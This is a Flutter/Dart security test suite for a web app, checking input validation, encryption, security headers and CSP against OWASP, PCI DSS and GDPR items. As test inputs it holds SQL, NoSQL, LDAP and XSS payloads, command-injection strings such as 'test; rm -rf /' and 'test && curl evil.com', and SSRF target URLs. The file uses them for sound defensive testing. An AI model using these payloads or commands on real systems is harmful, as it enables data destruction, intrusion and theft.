import 'package:bel247_web/core/security/https_enforcement_service.dart';
import 'package:bel247_web/core/security/security_headers_service.dart';
import 'package:bel247_web/core/security/security_middleware_service.dart';
import 'package:bel247_web/core/services/crypto_service.dart';
import 'package:bel247_web/core/services/input_validator_service.dart';
import 'package:flutter_test/flutter_test.dart';

import 'test_setup.dart';

void main() {
  setUpAll(setupTestEnvironment);

  tearDownAll(cleanupTestEnvironment);

  group('Security Compliance Tests', () {
    group('OWASP Top 10 Compliance', () {
      test('A01: Broken Access Control - should validate all inputs', () {
        final validator = InputValidatorService();
        
        // Test that all user inputs are validated
        final testInputs = [
          'admin',
          'user@example.com',
          '1234567890',
          '100.50',
          'Password123!',
        ];

        for (final input in testInputs) {
          // All inputs should go through validation
          final emailResult = validator.validateEmail(input);
          final phoneResult = validator.validatePhoneNumber(input);
          final amountResult = validator.validateAmount(input);
          final passwordResult = validator.validatePassword(input);
          final textResult = validator.validateText(input, minLength: 1, maxLength: 100, fieldName: 'Test');
          
          // At least one validation should be applicable
          expect(
            emailResult.isValid || phoneResult.isValid || amountResult.isValid || 
            passwordResult.isValid || textResult.isValid,
            true,
            reason: 'Input should be valid for at least one validation type: $input'
          );
        }
      });

      test('A02: Cryptographic Failures - should use secure encryption', () {
        final cryptoService = CryptoService.instance;
        
        // Test encryption strength
        const sensitiveData = 'sensitive-information-12345';
        final encrypted = cryptoService.encryptString(sensitiveData);
        final decrypted = cryptoService.decryptString(encrypted);
        
        expect(decrypted, equals(sensitiveData), reason: 'Encryption should be reversible');
        expect(encrypted, isNot(equals(sensitiveData)), reason: 'Encrypted data should be different from original');
        
        // Test that encrypted data is not easily readable
        expect(encrypted.contains(sensitiveData), false, reason: 'Encrypted data should not contain original text');
      });

      test('A03: Injection - should prevent all injection attacks', () {
        final validator = InputValidatorService();
        
        final injectionAttempts = [
          // SQL Injection
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM users --",
          
          // NoSQL Injection
          r'{"$where": "this.password == this.username"}',
          r'{"$ne": null}',
          
          // Command Injection
          'test; rm -rf /',
          'test | cat /etc/passwd',
          'test && curl evil.com',
          
          // LDAP Injection
          '*)(uid=*))(|(uid=*',
          'admin)(&(password=*',
        ];

        for (final attempt in injectionAttempts) {
          final result = validator.validateText(
            attempt,
            minLength: 1,
            maxLength: 100,
            fieldName: 'Test',
          );
          
          // Should either reject or sanitize injection attempts
          if (result.isValid) {
            expect(result.sanitizedValue, isNotNull);
            // Sanitized value should not contain injection patterns
            expect(result.sanitizedValue!.contains("'"), false);
            expect(result.sanitizedValue!.contains(';'), false);
            expect(result.sanitizedValue!.contains('|'), false);
            expect(result.sanitizedValue!.contains('&'), false);
            expect(result.sanitizedValue!.contains('--'), false);
          } else {
            // If validation fails, that's also acceptable for security
            expect(result.errorMessage, isNotEmpty);
          }
        }
      });

      test('A04: Insecure Design - should have secure architecture', () {
        final middlewareService = SecurityMiddlewareService.instance;
        final securityReport = middlewareService.getSecurityReport();
        
        // Should have comprehensive security measures
        expect(securityReport.containsKey('https'), true, reason: 'Should have HTTPS enforcement');
        expect(securityReport.containsKey('headers'), true, reason: 'Should have security headers');
        expect(securityReport.containsKey('csp'), true, reason: 'Should have CSP configuration');
        
        // Should have good security score
        final overallScore = securityReport['overallSecurityScore'] as int;
        expect(overallScore, greaterThanOrEqualTo(70), reason: 'Security score should be at least 70/100');
      });

      test('A05: Security Misconfiguration - should have proper security headers', () {
        final headersService = SecurityHeadersService.instance;
        final headers = headersService.getAllSecurityHeaders();
        
        // Required security headers
        final requiredHeaders = [
          'Content-Security-Policy',
          'X-Frame-Options',
          'X-Content-Type-Options',
          'X-XSS-Protection',
          'Referrer-Policy',
          'Strict-Transport-Security',
        ];
        
        for (final header in requiredHeaders) {
          expect(headers.containsKey(header), true, reason: 'Should have $header header');
        }
        
        // Validate header values
        expect(headers['X-Frame-Options'], equals('DENY'), reason: 'X-Frame-Options should be DENY');
        expect(headers['X-Content-Type-Options'], equals('nosniff'), reason: 'X-Content-Type-Options should be nosniff');
        expect(headers['X-XSS-Protection'], equals('1; mode=block'), reason: 'X-XSS-Protection should be 1; mode=block');
      });

      test('A06: Vulnerable Components - should use secure dependencies', () {
        // This test would typically check for known vulnerabilities in dependencies
        // For now, we'll test that our security services are properly implemented
        
        final validator = InputValidatorService();
        final cryptoService = CryptoService.instance;
        final httpsService = HTTPSEnforcementService.instance;
        
        // All services should be properly instantiated
        expect(validator, isNotNull);
        expect(cryptoService, isNotNull);
        expect(httpsService, isNotNull);
        
        // Services should provide expected functionality
        expect(() => validator.validateEmail('test@example.com'), returnsNormally);
        expect(() => cryptoService.encryptString('test-data'), returnsNormally);
        expect(httpsService.validateHTTPSConfiguration, returnsNormally);
      });

      test('A07: Authentication Failures - should validate authentication data', () {
        final validator = InputValidatorService();
        
        // Test password validation
        final weakPasswords = [
          '123456',
          'password',
          'admin',
          '12345678',
        ];
        
        for (final password in weakPasswords) {
          final result = validator.validatePassword(password);
          expect(result.isValid, false, reason: 'Weak password should be rejected: $password');
        }
        
        // Test strong password acceptance
        final strongPasswords = [
          'Password123!',
          'MyStr0ng#Pass',
          'Test123@Pass',
        ];
        
        for (final password in strongPasswords) {
          final result = validator.validatePassword(password);
          expect(result.isValid, true, reason: 'Strong password should be accepted: $password');
        }
      });

      test('A08: Software and Data Integrity Failures - should validate data integrity', () {
        final cryptoService = CryptoService.instance;
        
        // Test data integrity
        const originalData = 'important-data-12345';
        final encrypted = cryptoService.encryptString(originalData);
        final decrypted = cryptoService.decryptString(encrypted);
        
        expect(decrypted, equals(originalData), reason: 'Data integrity should be maintained');
        
        // Test tampering detection
        final tamperedEncrypted = '${encrypted.substring(0, encrypted.length - 1)}X';
        expect(() => cryptoService.decryptString(tamperedEncrypted), throwsException, reason: 'Tampered data should be rejected');
      });

      test('A09: Security Logging Failures - should log security events', () {
        final middlewareService = SecurityMiddlewareService.instance;
        
        // Test security event handling
        final securityEvents = [
          'csp_violation',
          'mixed_content',
          'insecure_request',
        ];
        
        for (final eventType in securityEvents) {
          final eventData = {
            'timestamp': DateTime.now().toIso8601String(),
            'event': eventType,
            'details': 'Test security event',
          };
          
          // Should handle security events without throwing
          expect(() => middlewareService.handleSecurityEvent(eventType, eventData), returnsNormally);
        }
      });

      test('A10: Server-Side Request Forgery - should validate URLs', () {
        final validator = InputValidatorService();
        
        // Test URL validation
        final maliciousUrls = [
          'http://localhost:22',
          'http://127.0.0.1:3306',
          'http://169.254.169.254/latest/meta-data',
          'file:///etc/passwd',
          'ftp://internal-server',
        ];
        
        for (final url in maliciousUrls) {
          final result = validator.validateText(
            url,
            minLength: 1,
            maxLength: 100,
            fieldName: 'URL',
          );
          
          // Should sanitize or reject malicious URLs
          if (result.isValid) {
            expect(result.sanitizedValue, isNotNull);
            // Should not contain dangerous protocols or internal IPs in sanitized value
            expect(result.sanitizedValue!.contains('file://'), false);
            expect(result.sanitizedValue!.contains('127.0.0.1'), false);
            expect(result.sanitizedValue!.contains('169.254.169.254'), false);
          } else {
            // If validation fails, that's also acceptable for security
            expect(result.errorMessage, isNotEmpty);
          }
        }
      });
    });

    group('PCI DSS Compliance', () {
      test('should protect cardholder data', () {
        final cryptoService = CryptoService.instance;
        
        // Test credit card number encryption
        final cardNumbers = [
          '4111111111111111',
          '5555555555554444',
          '378282246310005',
          '6011111111111117',
        ];
        
        for (final cardNumber in cardNumbers) {
          final encrypted = cryptoService.encryptString(cardNumber);
          final decrypted = cryptoService.decryptString(encrypted);
          
          expect(decrypted, equals(cardNumber), reason: 'Card number should be properly encrypted/decrypted');
          expect(encrypted, isNot(equals(cardNumber)), reason: 'Encrypted card number should be different from original');
        }
      });

      test('should validate payment amounts', () {
        final validator = InputValidatorService();
        
        // Test payment amount validation
        final validAmounts = ['100.00', '0.01', '999999.99'];
        final invalidAmounts = ['-100.00', '1000000.00', 'abc', '100.999'];
        
        for (final amount in validAmounts) {
          final result = validator.validateAmount(amount);
          expect(result.isValid, true, reason: 'Valid amount should be accepted: $amount');
        }
        
        for (final amount in invalidAmounts) {
          final result = validator.validateAmount(amount);
          expect(result.isValid, false, reason: 'Invalid amount should be rejected: $amount');
        }
      });
    });

    group('GDPR Compliance', () {
      test('should protect personal data', () {
        final cryptoService = CryptoService.instance;
        final validator = InputValidatorService();
        
        // Test personal data protection
        final personalData = [
          'john.doe@example.com',
          '+1234567890',
          'John Doe',
          '123 Main Street',
        ];
        
        for (final data in personalData) {
          // Should validate personal data
          final validationResult = validator.validateText(
            data,
            minLength: 1,
            maxLength: 100,
            fieldName: 'Personal Data',
          );
          
          expect(validationResult.isValid, true, reason: 'Personal data should be valid: $data');
          
          // Should be able to encrypt personal data
          final encrypted = cryptoService.encryptString(data);
          final decrypted = cryptoService.decryptString(encrypted);
          
          expect(decrypted, equals(data), reason: 'Personal data should be properly encrypted/decrypted');
        }
      });

      test('should sanitize data for display', () {
        final validator = InputValidatorService();
        
        // Test data sanitization for display
        final displayData = [
          'User Name<script>alert("xss")</script>',
          'Description with <b>HTML</b> tags',
          'Comment with "quotes" and \'apostrophes\'',
        ];
        
        for (final data in displayData) {
          final sanitized = validator.sanitizeInput(data);
          
          // Should remove dangerous content
          expect(sanitized.contains('<script>'), false);
          expect(sanitized.contains('alert('), false);
          
          // Should escape dangerous characters (if any remain after tag removal)
          if (sanitized.contains('<') || sanitized.contains('>')) {
            expect(sanitized.contains('&lt;'), true);
            expect(sanitized.contains('&gt;'), true);
          }
        }
      });
    });

    group('Security Best Practices', () {
      test('should implement defense in depth', () {
        final middlewareService = SecurityMiddlewareService.instance;
        final securityReport = middlewareService.getSecurityReport();
        
        // Should have multiple layers of security
        expect(securityReport['https'], isNotNull, reason: 'Should have HTTPS enforcement');
        expect(securityReport['headers'], isNotNull, reason: 'Should have security headers');
        expect(securityReport['csp'], isNotNull, reason: 'Should have CSP protection');
        
        // Should have good overall security score
        final overallScore = securityReport['overallSecurityScore'] as int;
        expect(overallScore, greaterThanOrEqualTo(80), reason: 'Should have comprehensive security measures');
      });

      test('should follow principle of least privilege', () {
        final headersService = SecurityHeadersService.instance;
        final headers = headersService.getAllSecurityHeaders();
        
        // CSP should be restrictive
        final csp = headers['Content-Security-Policy'] ?? '';
        expect(csp.contains("'self'"), true, reason: 'CSP should allow only self');
        expect(csp.contains('frame-ancestors'), true, reason: 'CSP should control framing');
        
        // Permissions policy should be restrictive
        final permissionsPolicy = headers['Permissions-Policy'] ?? '';
        expect(permissionsPolicy.contains('camera=()'), true, reason: 'Should deny camera access');
        expect(permissionsPolicy.contains('microphone=()'), true, reason: 'Should deny microphone access');
        expect(permissionsPolicy.contains('geolocation=()'), true, reason: 'Should deny geolocation access');
      });

      test('should implement secure by default', () {
        final validator = InputValidatorService();
        
        // Default validation should be strict
        const testInput = 'test@example.com<script>alert("xss")</script>';
        final result = validator.validateEmail(testInput);
        
        expect(result.isValid, false, reason: 'Should reject malicious input by default');
        expect(result.errorMessage, isNotNull, reason: 'Should provide clear error message');
      });

      test('should provide security monitoring', () {
        final middlewareService = SecurityMiddlewareService.instance;
        final securityStatus = middlewareService.getSecurityStatus();
        
        // Should provide security monitoring capabilities
        expect(securityStatus.containsKey('isHTTPS'), true);
        expect(securityStatus.containsKey('hasSecurityHeaders'), true);
        expect(securityStatus.containsKey('hasCSP'), true);
        expect(securityStatus.containsKey('hasHSTS'), true);
        expect(securityStatus.containsKey('mixedContentIssues'), true);
        expect(securityStatus.containsKey('lastCheck'), true);
      });
    });
  });
}